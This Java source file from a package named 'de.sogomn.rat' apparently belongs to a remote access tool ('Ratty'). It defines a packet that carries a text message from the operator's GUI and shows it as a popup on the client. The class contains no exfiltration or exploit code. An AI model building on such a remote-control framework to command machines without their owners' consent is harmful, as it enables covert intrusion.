package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.server.gui.RattyGui;



public final class PopupPacket implements IPacket {
	
	private String message;
	
	public PopupPacket(final String message) {
		this.message = message;
	}
	
	public PopupPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(message);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		message = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		RattyGui.showMessage(message);
	}
	
	public String getMessage() {
		return message;
	}
	
	public static PopupPacket create() {
		final String input = RattyGui.getInput();
		final PopupPacket packet = new PopupPacket(input);
		
		return packet;
	}
	
}
